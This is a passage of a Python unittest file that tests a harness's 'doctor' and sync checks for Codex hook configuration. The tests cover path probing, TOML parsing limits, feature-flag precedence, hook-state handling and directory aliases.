            rf"requirements hooks\.{field} is not an existing directory",
        ):
            harness.parse_hooks_document(
                json.dumps(document), source_kind="requirements"
            )

    def test_requirements_unc_managed_dirs_are_never_stat_probed(self) -> None:
        # An SMB stat blocks for tens of seconds off-VPN and then answers about
        # reachability, so existence stays unproven for a UNC managed dir. Both
        # spellings are recognized on both platforms.
        for value in ("//fileserver/codex/hooks", "\\\\fileserver\\codex\\hooks"):
            with self.subTest(value=value):
                self.assertFalse(
                    harness.requirements_hook_path_is_locally_probeable(value)
                )
        for value in ("C:/managed/hooks", "/managed/hooks"):
            with self.subTest(value=value):
                self.assertTrue(
                    harness.requirements_hook_path_is_locally_probeable(value)
                )
        # The absoluteness rule still applies to a UNC-looking relative value.
        with self.assertRaisesRegex(harness.HarnessError, r"must be an absolute path"):
            harness.validate_requirements_hook_paths({"managed_dir": "fileserver/x"})

    @unittest.skipUnless(sys.platform == "win32", "Windows-only managed field")
    def test_a_unc_windows_managed_dir_is_never_stat_probed(self) -> None:
        with mock.patch.object(
            harness.Path, "is_dir", side_effect=AssertionError("probed a network path")
        ):
            harness.validate_requirements_hook_paths(
                {"windows_managed_dir": "\\\\fileserver\\codex\\hooks"}
            )

    @unittest.skipIf(sys.platform == "win32", "POSIX-only managed field")
    def test_a_double_slash_posix_managed_dir_is_probed(self) -> None:
        # The UNC exemption answers about WINDOWS path semantics. On POSIX
        # `//missing/share` is an ordinary absolute path, so reparsing it as a
        # share would skip the probe and certify a directory Codex cannot load.
        with self.assertRaisesRegex(
            harness.HarnessError,
            r"requirements hooks\.managed_dir is not an existing directory",
        ):
            harness.validate_requirements_hook_paths({"managed_dir": "//missing/share"})

    def test_local_windows_device_paths_are_still_probed(self) -> None:
        # `\\?\C:\...` and `\\.\C:\...` carry a `\\`-prefixed drive but address
        # a LOCAL device: skipping the existence probe would let doctor certify
        # a managed hook directory Codex will reject.
        for value in ("//?/C:/managed", "\\\\?\\C:\\managed", "//./C:/managed"):
            with self.subTest(value=value):
                self.assertTrue(
                    harness.requirements_hook_path_is_locally_probeable(value)
                )
        # The device spelling of a real share stays unprobeable.
        for value in ("//?/UNC/fileserver/codex", "\\\\?\\UNC\\fileserver\\codex"):
            with self.subTest(value=value):
                self.assertFalse(
                    harness.requirements_hook_path_is_locally_probeable(value)
                )

    @unittest.skipUnless(sys.platform == "win32", "Windows-only managed field")
    def test_missing_windows_device_managed_dir_is_rejected(self) -> None:
        missing = Path(self.temp.name) / "managed-hooks-absent"
        with self.assertRaisesRegex(
            harness.HarnessError,
            r"requirements hooks\.windows_managed_dir is not an existing directory",
        ):
            harness.validate_requirements_hook_paths(
                {"windows_managed_dir": f"//?/{missing.as_posix()}"}
            )

    def test_requirements_managed_dirs_are_validated_per_platform_flavor(self) -> None:
        # Codex resolves `managed_dir` on POSIX and `windows_managed_dir` on
        # Windows. Accepting either flavour for either field false-greens a
        # value the consuming host will treat as relative.
        wrong_flavour = (
            ("managed_dir", "C:/managed/hooks"),
            ("managed_dir", "\\\\fileserver\\codex\\hooks"),
            ("windows_managed_dir", "/managed/hooks"),
        )
        for field, value in wrong_flavour:
            with self.subTest(field=field, value=value):
                with self.assertRaisesRegex(
                    harness.HarnessError,
                    rf"requirements hooks\.{field} must be an absolute path",
                ):
                    harness.validate_requirements_hook_paths({field: value})

    def test_requirements_hook_paths_reject_managed_file(self) -> None:
        not_a_directory = Path(self.temp.name) / "managed-hooks-file"
        not_a_directory.write_text("", encoding="utf-8")
        document = {"hooks": self.requirements_hook_paths(not_a_directory)}
        with self.assertRaisesRegex(
            harness.HarnessError, r"is not an existing directory"
        ):
            harness.parse_hooks_document(
                json.dumps(document), source_kind="requirements"
            )

    def test_doctor_rejects_relative_requirements_managed_dir(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements='[hooks]\nmanaged_dir = "relative"\n'
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("hooks.managed_dir must be an absolute path", output)

    def test_toml_config_rejects_out_of_range_integers(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            f"[hooks]\nignored = {harness.I64_MAX + 1}\n", encoding="utf-8"
        )
        with self.assertRaises(harness.HarnessError):
            harness.toml_config(config)

    def test_toml_config_normalizes_parser_recursion(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            "ignored = " + ("[" * 1100) + "0" + ("]" * 1100), encoding="utf-8"
        )
        with self.assertRaises(harness.HarnessError):
            harness.toml_config(config)

    def test_toml_config_handles_deep_post_parse_validation(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(("nested." * 1100) + "leaf = 0", encoding="utf-8")
        self.assertIsNotNone(harness.toml_config(config))

    def test_inline_hooks_preserve_ignored_toml_datetime(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            "[hooks]\nFutureEvent = 1979-05-27T07:32:00Z\n"
            + self.inline_floor_config_text(),
            encoding="utf-8",
        )
        document = harness.inline_hooks_document(config)
        self.assertEqual(
            len(harness.managed_codex_floor_groups(document, source_kind="config")),
            1,
        )

    def test_inline_hook_conversions_normalize_serializer_recursion(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text("hooks.nested.leaf = 0\n", encoding="utf-8")
        # Baseline that keeps the assertions below non-vacuous.
        self.assertEqual(
            json.loads(harness.inline_hooks_document(config)),
            {"hooks": {"nested": {"leaf": 0}}},
        )

        serialized = []

        def failing_dumps(payload, **kwargs):
            serialized.append(payload)
            raise RecursionError("fixture depth")

        with mock.patch.object(harness.json, "dumps", side_effect=failing_dumps):
            for convert in (
                harness.inline_hooks_document,
                harness.inline_hook_documents_from_config,
            ):
                with self.subTest(convert=convert.__name__):
                    with self.assertRaisesRegex(
                        harness.HarnessError,
                        r"unsupported inline hooks value in .*fixture depth",
                    ):
                        convert(config)
        self.assertEqual(serialized, [{"hooks": {"nested": {"leaf": 0}}}] * 2)

    def test_deep_inline_hooks_never_leak_a_raw_recursion_error(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text("hooks." + ("nested." * 10000) + "leaf = 0", encoding="utf-8")

        for convert in (
            harness.inline_hooks_document,
            harness.inline_hook_documents_from_config,
        ):
            with self.subTest(convert=convert.__name__):
                try:
                    converted = convert(config)
                except harness.HarnessError as error:
                    self.assertRegex(
                        str(error), r"unsupported inline hooks value in .*config\.toml"
                    )
                else:
                    # A Python that survives the depth must carry the whole
                    # inline document across, not a truncated prefix.
                    document = (
                        converted
                        if isinstance(converted, str)
                        else "".join(text for _location, text in converted)
                    )
                    self.assertEqual(document.count('"nested"'), 10000)

    def test_doctor_rejects_malformed_sibling_project_event(self) -> None:
        repo = self.make_repo()
        adapter_path = Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        adapter = json.loads(adapter_path.read_text(encoding="utf-8"))
        adapter["hooks"]["SessionStart"] = [
            {"hooks": [{"type": "command", "command": 7}]}
        ]
        self.write_hooks(repo, json.dumps(adapter))

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("[FAIL] project Codex floor", output)
        self.assertIn("SessionStart", output)

    def test_doctor_rejects_malformed_sibling_global_event(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        malformed_global = (
            "[[hooks.SessionStart]]\n"
            "[[hooks.SessionStart.hooks]]\n"
            'type = "command"\n'
            "command = 7\n"
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=malformed_global
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("SessionStart", output)

    def test_doctor_rejects_malformed_user_hook_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=(
                "[hooks.state.floor]\n" 'enabled = "yes"\n' 'trusted_hash = "abc"\n'
            ),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("hooks.state.floor.enabled", output)

    def test_doctor_rejects_malformed_project_hook_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        config = repo / ".codex" / "config.toml"
        config.write_text("[hooks.state.floor]\n" 'enabled = "yes"\n', encoding="utf-8")

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex hook source", output)
        self.assertIn("[FAIL] project Codex floor", output)
        self.assertIn("hooks.state.floor.enabled", output)

    def test_doctor_rejects_malformed_requirements_hook_path(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements="[hooks]\nmanaged_dir = 7\n"
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] no inspectable global Codex floor", output)
        self.assertIn("hooks.managed_dir", output)

    def test_doctor_rejects_managed_only_hook_policy(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements="allow_managed_hooks_only = true\n"
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("allow_managed_hooks_only=true", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_accepts_explicit_unmanaged_hook_policy(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements="allow_managed_hooks_only = false\n"
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_malformed_managed_only_hook_policy(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, system_requirements='allow_managed_hooks_only = "false"\n'
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("must be a boolean", output)

    def test_doctor_rejects_required_hook_feature_disable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            system_requirements=("[feature_requirements]\n" "codex_hooks = false\n"),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("feature_requirements.codex_hooks=false", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_uses_canonical_required_hook_feature_precedence(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            system_requirements=(
                "[features]\n" "codex_hooks = false\n" "hooks = true\n"
            ),
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_fails_closed_when_a_pin_contests_feature_disables(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            "[features]\nhooks = false\n", encoding="utf-8"
        )

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            system_requirements="[features]\nhooks = true\n",
            user_config="[features]\nhooks = false\n",
            profile_configs={"custom.config.toml": "[features]\ncodex_hooks = false\n"},
        )

        # Codex's merge order for a managed requirements pin against stored
        # config features is not statically provable, so the contest fails
        # closed and names both sides instead of certifying a floor that a
        # project-local opt-out may have already killed.
        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("[FAIL] project Codex floor", output)
        self.assertIn("contests 3 hook-feature disable(s)", output)
        self.assertIn("UNPROVEN", output)
        self.assertIn("features.hooks", output)
        self.assertIn("features.codex_hooks", output)

    def test_doctor_still_rejects_feature_disables_when_the_pin_is_false(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            system_requirements="[features]\nhooks = false\n",
            user_config="[features]\nhooks = false\n",
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("inspectable activation blocker(s)", output)
        # A pin of false agrees with the disable; there is nothing to contest.
        self.assertNotIn("contests", output)

    def test_doctor_keeps_handler_state_blockers_under_a_requirements_pin(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        hooks_path = self.write_hooks(repo, valid_adapter).resolve()
        key = f"{hooks_path}:pre_tool_use:0:0"

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            system_requirements="[features]\nhooks = true\n",
            user_config=(
                f"[features]\nhooks = false\n\n"
                f"[hooks.state.{json.dumps(key)}]\nenabled = false\n"
            ),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("enabled=false", output)
        # The per-handler state blocker is independent of the feature contest:
        # both are reported, and neither is cleared by the managed pin.
        self.assertIn("contests 1 hook-feature disable(s)", output)

    def test_requirements_hook_feature_schema_is_fail_closed(self) -> None:
        requirements = Path(self.temp.name) / "requirements.toml"
        invalid_documents = (
            '[features]\nhooks = "false"\n',
            "[features]\nhooks = true\n\n"
            "[feature_requirements]\ncodex_hooks = true\n",
            '[features]\nunknown_future_feature = "invalid"\n',
        )
        for document in invalid_documents:
            with self.subTest(document=document):
                requirements.write_text(document, encoding="utf-8")
                with self.assertRaises(harness.HarnessError):
                    harness.requirements_hook_feature_declaration(requirements)

    def test_doctor_accepts_explicit_hook_feature_enable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=("[features]\n" "codex_hooks = false\n" "hooks = true\n"),
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_persisted_hook_feature_disables(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config="[features]\nhooks = false\n",
            system_config="[features]\ncodex_hooks = false\n",
            profile_configs={"custom.config.toml": "[features]\nhooks = false\n"},
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("features.hooks", output)
        self.assertIn("features.codex_hooks", output)

    def test_doctor_rejects_project_hook_feature_disable(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            "[features]\nhooks = false\n", encoding="utf-8"
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_rejects_legacy_profile_selection(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config='profile = "custom"\n'
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("legacy profile selection", output)

    def test_doctor_ignores_project_legacy_profile_selection(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            (
                'profile = "custom"\n\n'
                '[profiles.custom.features]\nhooks = "project-denylisted"\n'
            ),
            encoding="utf-8",
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_malformed_inactive_legacy_profile_feature(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config=('[profiles.custom.features]\nfuture_feature = "invalid"\n'),
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("profiles.custom", output)
        self.assertIn("must be a boolean", output)

    def test_hook_feature_profile_schema_is_fail_closed(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        invalid_documents = (
            "profiles = 7\n",
            "[profiles]\ncustom = 7\n",
            '[profiles.custom.features]\nfuture_feature = "invalid"\n',
        )
        for document in invalid_documents:
            with self.subTest(document=document):
                config.write_text(document, encoding="utf-8")
                with self.assertRaises(harness.HarnessError):
                    harness.hook_feature_declarations(
                        config, reject_legacy_profile=True
                    )

    def test_doctor_rejects_nonboolean_project_feature_sibling(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            '[features]\nfuture_feature = "invalid"\n', encoding="utf-8"
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("features.future_feature", output)
        self.assertIn("must be a boolean", output)

    def test_doctor_ignores_project_only_system_proxy_feature(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        (repo / ".codex" / "config.toml").write_text(
            '[features]\nrespect_system_proxy = "project-denylisted"\n',
            encoding="utf-8",
        )

        result, output = self.run_doctor_with_fixture_globals(repo)

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_malformed_user_system_proxy_feature(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo,
            user_config='[features]\nrespect_system_proxy = "invalid"\n',
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("features.respect_system_proxy", output)
        self.assertIn("must be a boolean", output)

    def test_hook_feature_schema_accepts_structured_codex_features(self) -> None:
        config = Path(self.temp.name) / "config.toml"
        config.write_text(
            """
[features]
hooks = true
future_feature = false

[features.code_mode]
enabled = true
excluded_tool_namespaces = ["mcp"]
direct_only_tool_namespaces = ["functions"]

[features.multi_agent_v2]
enabled = true
max_concurrent_threads_per_session = 4
min_wait_timeout_ms = 10000
max_wait_timeout_ms = 3600000
default_wait_timeout_ms = 30000
usage_hint_enabled = false
usage_hint_text = "hint"
root_agent_usage_hint_text = "root"
subagent_usage_hint_text = "subagent"
multi_agent_mode_hint_text = "mode"
tool_namespace = "collaboration"
hide_spawn_agent_metadata = true
expose_spawn_agent_model_overrides = true
non_code_mode_only = false

[features.token_budget]
enabled = true
reminder_threshold_tokens = 12000
reminder_message_template = "{n_remaining} remain"
guidance_message = "wrap up"
auto_compact_fallback_prompt = "record state"
auto_compact_fallback_buffer_tokens = 1000

[features.rollout_budget]
enabled = true
limit_tokens = 100000
reminder_at_remaining_tokens = [50000, 10000]
sampling_token_weight = 1.0
prefill_token_weight = 0.5

[features.current_time_reminder]
enabled = true
reminder_interval_seconds = 60
clock_source = "system"
delivery_mode = "after_user_or_tool_output"
sleep_tool = true

[features.apps_mcp_path_override]
enabled = false
path = "apps.json"

[features.network_proxy]
enabled = true
proxy_url = "http://127.0.0.1:8080"
enable_socks5 = true
socks_url = "socks5://127.0.0.1:1080"
enable_socks5_udp = false
allow_upstream_proxy = false
dangerously_allow_non_loopback_proxy = false
dangerously_allow_all_unix_sockets = false
mode = "limited"
allow_local_binding = true

[features.network_proxy.domains]
"example.com" = "allow"

[features.network_proxy.unix_sockets]
"/tmp/example.sock" = "deny"
""",
            encoding="utf-8",
        )

        declarations = harness.hook_feature_declarations(config)

        self.assertEqual(len(declarations), 1)
        self.assertTrue(declarations[0][1])

    def test_hook_feature_schema_rejects_malformed_structured_features(
        self,
    ) -> None:
        config = Path(self.temp.name) / "config.toml"
        invalid_documents = (
            "[features.code_mode]\nunknown = true\n",
            ("[features.multi_agent_v2]\n" "max_concurrent_threads_per_session = -1\n"),
            '[features.token_budget]\nreminder_threshold_tokens = "many"\n',
            (
                "[features.rollout_budget]\n"
                "reminder_at_remaining_tokens = [100, true]\n"
            ),
            '[features.current_time_reminder]\nclock_source = "local"\n',
            "[features.apps_mcp_path_override]\npath = 7\n",
            ("[features.network_proxy.domains]\n" '"example.com" = "prompt"\n'),
            "[features.network_proxy]\nunknown = true\n",
        )
        for document in invalid_documents:
            with self.subTest(document=document):
                config.write_text(document, encoding="utf-8")
                with self.assertRaises(harness.HarnessError):
                    harness.hook_feature_declarations(config)

    def test_doctor_ignores_managed_only_key_outside_requirements(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config="allow_managed_hooks_only = true\n"
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_doctor_rejects_disabled_canonical_floor_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        hooks_path = self.write_hooks(repo, valid_adapter).resolve()
        key = f"{hooks_path}:pre_tool_use:0:0"
        user_config = f"[hooks.state.{json.dumps(key)}]\nenabled = false\n"

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=user_config
        )

        self.assertEqual(result, 1)
        self.assertIn("[FAIL] Codex project hook activation", output)
        self.assertIn("enabled=false", output)
        self.assertIn("[FAIL] project Codex floor", output)

    def test_doctor_rejects_disabled_logical_alias_floor_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        alias = Path(self.temp.name) / "repo-alias"
        remove_alias = self.make_directory_alias(repo, alias)
        try:
            with mock.patch.object(harness.os.path, "isjunction", None, create=True):
                self.assertTrue(harness.path_is_alias(alias))
            logical_hooks = alias / ".codex" / "hooks.json"
            self.assertNotEqual(logical_hooks, logical_hooks.resolve())
            key = f"{logical_hooks}:pre_tool_use:0:0"
            user_config = f"[hooks.state.{json.dumps(key)}]\nenabled = false\n"

            result, output = self.run_doctor_with_fixture_globals(
                alias, user_config=user_config
            )

            self.assertEqual(result, 1)
            self.assertIn("[FAIL] Codex project hook activation", output)
            self.assertIn(repr(key), output)
            self.assertIn("enabled=false", output)
            self.assertIn("[FAIL] project Codex floor", output)
        finally:
            remove_alias()

    def test_doctor_rejects_cross_repo_logical_alias_topology(self) -> None:
        root = Path(self.temp.name)
        repo_a = root / "repo-a"
        repo_b = root / "repo-b"
        for repo in (repo_a, repo_b):
            subprocess.run(["git", "init", "-q", str(repo)], check=True)
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo_b, valid_adapter)
        target = repo_b / "subdir"
        target.mkdir()
        alias = repo_a / "linked-into-b"
        remove_alias = self.make_directory_alias(target, alias)
        try:
            result, output = self.run_doctor_with_fixture_globals(alias)

            self.assertEqual(result, 1)
            self.assertIn("[FAIL] Codex hook source", output)
            self.assertIn("logical Codex project root disagrees", output)
            self.assertIn(str(repo_a), output)
            self.assertIn(str(repo_b.resolve()), output)
            self.assertIn("[FAIL] project Codex floor", output)
        finally:
            remove_alias()

    def test_doctor_rejects_same_repo_alias_with_different_ancestry(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        logical_parent = repo / "container"
        logical_config = logical_parent / ".codex" / "config.toml"
        logical_config.parent.mkdir(parents=True)
        logical_config.write_text("[features]\nhooks = false\n", encoding="utf-8")
        target = repo / "elsewhere" / "target"
        target.mkdir(parents=True)
        alias = logical_parent / "linked-target"
        remove_alias = self.make_directory_alias(target, alias)
        try:
            result, output = self.run_doctor_with_fixture_globals(alias)

            self.assertEqual(result, 1)
            self.assertIn("[FAIL] Codex hook source", output)
            self.assertIn("different project-layer ancestry", output)
            self.assertIn("container", output)
            self.assertIn("elsewhere", output)
            self.assertIn("[FAIL] project Codex floor", output)
        finally:
            remove_alias()

    def test_doctor_ignores_unrelated_disabled_hook_state(self) -> None:
        repo = self.make_repo()
        valid_adapter = (
            Path(harness.__file__).resolve().parent / ".codex" / "hooks.json"
        ).read_text(encoding="utf-8")
        self.write_hooks(repo, valid_adapter)
        user_config = '[hooks.state."C:/other/hooks.json:pre_tool_use:0:0"]\n'
        user_config += "enabled = false\n"

        result, output = self.run_doctor_with_fixture_globals(
            repo, user_config=user_config
        )

        self.assertEqual(result, 0, output)
        self.assertIn("[ok] Codex project hook activation", output)

    def test_sync_global_keeps_floor_project_local(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        codex_source = config_root / "codex"
        (codex_source / "skills" / "sample").mkdir(parents=True)
        (codex_source / "AGENTS.md").write_text("# laws\n", encoding="utf-8")
        (codex_source / "skills" / "sample" / "SKILL.md").write_text(
            "# sample\n", encoding="utf-8"
        )
        codex_home = root / "codex-home"
        claude_home = root / "claude-home"
        skills_home = root / "skills-home"
        codex_home.mkdir()
        (codex_home / "hooks.json").write_text(
            json.dumps(
                {
                    "hooks": {
                        "SessionStart": [
                            {"hooks": [{"type": "command", "command": "keep"}]}
                        ],
                        "PreToolUse": [
                            {
                                "hooks": [
                                    harness.canonical_legacy_codex_floor_handler(
                                        codex_home / "hooks" / "dispatch.py"
                                    )
                                ]
                            }
                        ],
                    }
                }
            ),
            encoding="utf-8",
        )
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(codex_home),
            claude_home=str(claude_home),
            skills_home=str(skills_home),
            apply=True,
        )
        self.assertEqual(harness.sync_global(args), 0)
        hooks = json.loads((codex_home / "hooks.json").read_text(encoding="utf-8"))
        self.assertIn("SessionStart", hooks["hooks"])
        self.assertNotIn("PreToolUse", hooks["hooks"])
        harness_root = Path(harness.__file__).resolve().parent
        self.assertTrue(
            harness.same_file(
                harness_root / "templates" / "hooks" / "dispatch.py",
                claude_home / "hooks" / "dispatch.py",
            )
        )
        self.assertFalse((codex_home / "hooks" / "dispatch.py").exists())

    def test_sync_global_allows_absent_hooks_file(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        codex_source = config_root / "codex"
        (codex_source / "skills" / "sample").mkdir(parents=True)
        (codex_source / "AGENTS.md").write_text("# laws\n", encoding="utf-8")
        (codex_source / "skills" / "sample" / "SKILL.md").write_text(
            "# sample\n", encoding="utf-8"
        )
        codex_home = root / "codex-home"
        codex_home.mkdir()
        args = SimpleNamespace(
            config_root=str(config_root),
            codex_home=str(codex_home),
            claude_home=str(root / "claude-home"),
            skills_home=str(root / "skills-home"),
            apply=False,
        )

        self.assertEqual(harness.sync_global(args), 0)
        self.assertFalse((codex_home / "hooks.json").exists())

    def test_sync_global_refuses_retained_custom_floor(self) -> None:
        root = Path(self.temp.name)
        config_root = root / "config"
        codex_source = config_root / "codex"
        (codex_source / "skills" / "sample").mkdir(parents=True)
        (codex_source / "AGENTS.md").write_text("# laws\n", encoding="utf-8")
        (codex_source / "skills" / "sample" / "SKILL.md").write_text(
            "# sample\n", encoding="utf-8"
        )
        codex_home = root / "codex-home"
        codex_home.mkdir()
        original = json.dumps(
            {
                "hooks": {
